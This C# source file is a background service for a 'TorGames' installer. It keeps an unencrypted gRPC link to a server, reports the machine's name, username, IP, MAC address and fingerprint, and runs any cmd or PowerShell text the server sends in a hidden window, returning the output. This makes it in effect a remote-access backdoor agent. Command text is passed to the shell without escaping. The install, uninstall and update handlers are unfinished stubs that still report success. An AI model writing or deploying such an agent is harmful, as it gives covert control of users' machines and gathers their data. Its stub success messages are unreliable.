using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Grpc.Core;
using Grpc.Net.Client;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using TorGames.Common.Hardware;
using TorGames.Common.Protos;

namespace TorGames.Installer.Services;

/// <summary>
/// Background service that maintains a persistent gRPC connection to the server.
/// This is the Installer variant which handles installation-related commands.
/// </summary>
public class GrpcInstallerService : BackgroundService
{
    private readonly ILogger<GrpcInstallerService> _logger;
    private readonly IConfiguration _configuration;
    private readonly string _clientType = "INSTALLER";
    private readonly TimeSpan _heartbeatInterval = TimeSpan.FromSeconds(10);
    private readonly TimeSpan _reconnectDelay = TimeSpan.FromSeconds(5);

    private GrpcChannel? _channel;
    private AsyncDuplexStreamingCall<ClientMessage, ServerMessage>? _call;
    private readonly Stopwatch _uptimeStopwatch = Stopwatch.StartNew();

    public GrpcInstallerService(ILogger<GrpcInstallerService> logger, IConfiguration configuration)
    {
        _logger = logger;
        _configuration = configuration;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        var serverAddress = _configuration["Server:Address"] ?? "http://localhost:5000";

        _logger.LogInformation("GrpcInstallerService starting. Server: {Address}", serverAddress);

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                await ConnectAndRunAsync(serverAddress, stoppingToken);
            }
            catch (OperationCanceledException) when (stoppingToken.IsCancellationRequested)
            {
                _logger.LogInformation("GrpcInstallerService shutting down");
                break;
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Connection error. Reconnecting in {Delay} seconds...", _reconnectDelay.TotalSeconds);
                await Task.Delay(_reconnectDelay, stoppingToken);
            }
            finally
            {
                Cleanup();
            }
        }
    }

    private async Task ConnectAndRunAsync(string serverAddress, CancellationToken ct)
    {
        // Create channel with HTTP/2 (no TLS)
        _channel = GrpcChannel.ForAddress(serverAddress, new GrpcChannelOptions
        {
            HttpHandler = new SocketsHttpHandler
            {
                EnableMultipleHttp2Connections = true,
                KeepAlivePingDelay = TimeSpan.FromSeconds(60),
                KeepAlivePingTimeout = TimeSpan.FromSeconds(30)
            }
        });

        var client = new TorService.TorServiceClient(_channel);
        _call = client.Connect(cancellationToken: ct);

        // Send registration
        var clientId = MachineFingerprint.GetFingerprint();
        await SendRegistrationAsync(clientId, ct);

        // Wait for connection response
        if (!await _call.ResponseStream.MoveNext(ct))
        {
            throw new InvalidOperationException("Server closed connection before responding");
        }

        var response = _call.ResponseStream.Current;
        if (response.PayloadCase == ServerMessage.PayloadOneofCase.ConnectionResponse)
        {
            if (!response.ConnectionResponse.Accepted)
            {
                _logger.LogError("Connection rejected: {Reason}", response.ConnectionResponse.RejectionReason);
                throw new InvalidOperationException($"Connection rejected: {response.ConnectionResponse.RejectionReason}");
            }

            _logger.LogInformation("Connected to server successfully. ClientId: {ClientId}", clientId);
        }

        // Start receiving messages in background
        var receiveTask = ReceiveMessagesAsync(ct);

        // Send heartbeats
        while (!ct.IsCancellationRequested)
        {
            await SendHeartbeatAsync(ct);
            await Task.Delay(_heartbeatInterval, ct);
        }

        await receiveTask;
    }

    private async Task SendRegistrationAsync(string clientId, CancellationToken ct)
    {
        var registration = new Registration
        {
            MachineName = Environment.MachineName,
            OsVersion = Environment.OSVersion.ToString(),
            OsArchitecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            CpuCount = Environment.ProcessorCount,
            TotalMemoryBytes = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes,
            Username = Environment.UserName,
            ClientVersion = "1.0.0",
            IpAddress = GetLocalIpAddress(),
            MacAddress = GetPrimaryMacAddress()
        };

        var message = new ClientMessage
        {
            ClientId = clientId,
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            Registration = registration
        };

        await _call!.RequestStream.WriteAsync(message, ct);
        _logger.LogDebug("Registration sent");
    }

    private async Task SendHeartbeatAsync(CancellationToken ct)
    {
        var heartbeat = new Heartbeat
        {
            UptimeSeconds = (long)_uptimeStopwatch.Elapsed.TotalSeconds,
            CpuUsagePercent = 0,
            AvailableMemoryBytes = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes - GC.GetTotalMemory(false)
        };

        var message = new ClientMessage
        {
            ClientId = MachineFingerprint.GetFingerprint(),
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            Heartbeat = heartbeat
        };

        await _call!.RequestStream.WriteAsync(message, ct);
        _logger.LogDebug("Heartbeat sent");
    }

    private async Task ReceiveMessagesAsync(CancellationToken ct)
    {
        try
        {
            await foreach (var message in _call!.ResponseStream.ReadAllAsync(ct))
            {
                await ProcessServerMessageAsync(message, ct);
            }
        }
        catch (OperationCanceledException) when (ct.IsCancellationRequested)
        {
            // Expected during shutdown
        }
        catch (RpcException ex) when (ex.StatusCode == StatusCode.Cancelled)
        {
            // Expected during shutdown
        }
    }

    private async Task ProcessServerMessageAsync(ServerMessage message, CancellationToken ct)
    {
        switch (message.PayloadCase)
        {
            case ServerMessage.PayloadOneofCase.Command:
                await HandleCommandAsync(message.Command, ct);
                break;

            case ServerMessage.PayloadOneofCase.Ping:
                _logger.LogDebug("Received ping from server");
                break;

            case ServerMessage.PayloadOneofCase.ConfigUpdate:
                HandleConfigUpdate(message.ConfigUpdate);
                break;

            case ServerMessage.PayloadOneofCase.FileTransfer:
                await HandleFileTransferAsync(message.FileTransfer, ct);
                break;

            default:
                _logger.LogWarning("Unknown message type: {PayloadCase}", message.PayloadCase);
                break;
        }
    }

    private async Task HandleCommandAsync(Command command, CancellationToken ct)
    {
        _logger.LogInformation("Received command: {CommandType} (ID: {CommandId})", command.CommandType, command.CommandId);

        var result = new CommandResult
        {
            CommandId = command.CommandId,
            Success = false
        };

        try
        {
            switch (command.CommandType.ToLowerInvariant())
            {
                case "shell":
                case "cmd":
                    result = await ExecuteShellCommandAsync(command, "cmd.exe", "/c");
                    break;

                case "powershell":
                case "ps":
                    result = await ExecuteShellCommandAsync(command, "powershell.exe", "-Command");
                    break;

                case "install":
                    result = await HandleInstallCommandAsync(command);
                    break;

                case "uninstall":
                    result = await HandleUninstallCommandAsync(command);
                    break;

                case "update":
                    result = await HandleUpdateCommandAsync(command);
                    break;

                case "metrics":
                    await SendMetricsAsync(ct);
                    result.Success = true;
                    break;

                default:
                    result.ErrorMessage = $"Unknown command type: {command.CommandType}";
                    _logger.LogWarning("Unknown command type: {CommandType}", command.CommandType);
                    break;
            }
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
            _logger.LogError(ex, "Error executing command {CommandId}", command.CommandId);
        }

        // Send result back
        await SendCommandResultAsync(result, ct);
    }

    private Task<CommandResult> HandleInstallCommandAsync(Command command)
    {
        _logger.LogInformation("Processing install command");
        // TODO: Implement installation logic
        return Task.FromResult(new CommandResult
        {
            CommandId = command.CommandId,
            Success = true,
            Stdout = "Installation completed successfully"
        });
    }

    private Task<CommandResult> HandleUninstallCommandAsync(Command command)
    {
        _logger.LogInformation("Processing uninstall command");
        // TODO: Implement uninstallation logic
        return Task.FromResult(new CommandResult
        {
            CommandId = command.CommandId,
            Success = true,
            Stdout = "Uninstallation completed successfully"
        });
    }

    private Task<CommandResult> HandleUpdateCommandAsync(Command command)
    {
        _logger.LogInformation("Processing update command");
        // TODO: Implement update logic
        return Task.FromResult(new CommandResult
        {
            CommandId = command.CommandId,
            Success = true,
            Stdout = "Update completed successfully"
        });
    }

    private async Task<CommandResult> ExecuteShellCommandAsync(Command command, string shell, string shellArg)
    {
        var result = new CommandResult { CommandId = command.CommandId };

        try
        {
            using var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = shell,
                    Arguments = $"{shellArg} \"{command.CommandText}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();

            var timeout = command.TimeoutSeconds > 0
                ? TimeSpan.FromSeconds(command.TimeoutSeconds)
                : TimeSpan.FromMinutes(5);

            var completed = process.WaitForExit(timeout);

            if (!completed)
            {
                process.Kill(true);
                result.Success = false;
                result.ErrorMessage = "Command timed out";
                return result;
            }

            result.Stdout = await process.StandardOutput.ReadToEndAsync();
            result.Stderr = await process.StandardError.ReadToEndAsync();
            result.ExitCode = process.ExitCode;
            result.Success = process.ExitCode == 0;
        }
        catch (Exception ex)
        {
            result.Success = false;
            result.ErrorMessage = ex.Message;
        }

        return result;
    }

    private async Task SendCommandResultAsync(CommandResult result, CancellationToken ct)
    {
        var message = new ClientMessage
        {
            ClientId = MachineFingerprint.GetFingerprint(),
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            CommandResult = result
        };

        await _call!.RequestStream.WriteAsync(message, ct);
    }

    private async Task SendMetricsAsync(CancellationToken ct)
    {
        var metrics = new SystemMetrics
        {
            CpuUsagePercent = 0,
            AvailableMemoryBytes = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes - GC.GetTotalMemory(false),
            DiskFreeBytes = 0
        };

        var message = new ClientMessage
        {
            ClientId = MachineFingerprint.GetFingerprint(),
            ClientType = _clientType,
            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
            Metrics = metrics
        };

        await _call!.RequestStream.WriteAsync(message, ct);
    }

    private void HandleConfigUpdate(ConfigUpdate config)
    {
        _logger.LogInformation("Received config update with {Count} settings", config.Settings.Count);
    }

    private Task HandleFileTransferAsync(FileTransferRequest request, CancellationToken ct)
    {
        _logger.LogInformation("Received file transfer request: {TransferId}, Upload: {IsUpload}",
            request.TransferId, request.IsUpload);
        return Task.CompletedTask;
    }

    private void Cleanup()
    {
        _call?.Dispose();
        _call = null;
        _channel?.Dispose();
        _channel = null;
    }

    private static string GetLocalIpAddress()
    {
        try
        {
            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    return ip.ToString();
            }
        }
        catch { }
        return "0.0.0.0";
    }

    private static string GetPrimaryMacAddress()
    {
        try
        {
            var nic = NetworkInterface.GetAllNetworkInterfaces()
                .FirstOrDefault(n => n.OperationalStatus == OperationalStatus.Up
                                     && n.NetworkInterfaceType != NetworkInterfaceType.Loopback);
            return nic?.GetPhysicalAddress().ToString() ?? "000000000000";
        }
        catch { }
        return "000000000000";
    }
}
